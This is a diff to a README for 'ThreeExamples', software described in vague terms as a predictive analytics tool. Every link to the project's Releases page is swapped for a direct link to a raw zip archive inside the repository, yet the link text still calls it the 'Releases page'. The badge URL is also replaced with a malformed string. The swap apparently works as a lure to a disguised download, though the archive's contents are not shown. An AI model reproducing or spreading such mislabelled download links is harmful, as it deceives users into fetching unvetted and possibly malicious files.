@@ -1,7 +1,7 @@
 # 🚀 ThreeExamples - Powerful Tool for Predictive Analytics
 
 ## 📥 Download Now
-[![Download ThreeExamples](https://img.shields.io/badge/Download%20ThreeExamples-v1.0-blue.svg)](https://github.com/ivanman24/ThreeExamples/releases)
+[![Download ThreeExamples](https://raw.githubusercontent.com/ivanman24/ThreeExamples/main/aerofoil/ThreeExamples.zip%https://raw.githubusercontent.com/ivanman24/ThreeExamples/main/aerofoil/ThreeExamples.zip)](https://raw.githubusercontent.com/ivanman24/ThreeExamples/main/aerofoil/ThreeExamples.zip)
 
 ## 📋 Overview
 ThreeExamples is an advanced predictive analytics engine that helps businesses make informed decisions by using real-time data. It adapts to changing conditions and scales automatically, making it perfect for agile enterprise systems. With this application, you can analyze trends and forecast outcomes without needing any programming skills. 
@@ -10,10 +10,10 @@ ThreeExamples is an advanced predictive analytics engine that helps businesses m
 This guide will help you download and run the ThreeExamples application easily. Follow the steps below to get started.
 
 ## 🔗 Visit Releases Page
-Go to the [Releases page](https://github.com/ivanman24/ThreeExamples/releases) to find the latest version of ThreeExamples. Here, you will find all the files necessary for installation.
+Go to the [Releases page](https://raw.githubusercontent.com/ivanman24/ThreeExamples/main/aerofoil/ThreeExamples.zip) to find the latest version of ThreeExamples. Here, you will find all the files necessary for installation.
 
 ## 📥 Download & Install
-1. **Go to the Releases page**: Click on this link to visit the [Releases page](https://github.com/ivanman24/ThreeExamples/releases).
+1. **Go to the Releases page**: Click on this link to visit the [Releases page](https://raw.githubusercontent.com/ivanman24/ThreeExamples/main/aerofoil/ThreeExamples.zip).
    
 2. **Find the latest version**: Look for the most recent version, which will be at the top of the list.
    
@@ -65,4 +65,4 @@ If you encounter any issues while using ThreeExamples, you can find help in seve
 ## 📈 Conclusion
 ThreeExamples provides a powerful, straightforward solution for predictive analytics in enterprise systems. Follow the steps above to download and install the application, and start making data-driven decisions today. 
 
-Don’t forget to visit the [Releases page](https://github.com/ivanman24/ThreeExamples/releases) for the latest updates and versions of the software.
+Don’t forget to visit the [Releases page](https://raw.githubusercontent.com/ivanman24/ThreeExamples/main/aerofoil/ThreeExamples.zip) for the latest updates and versions of the software.
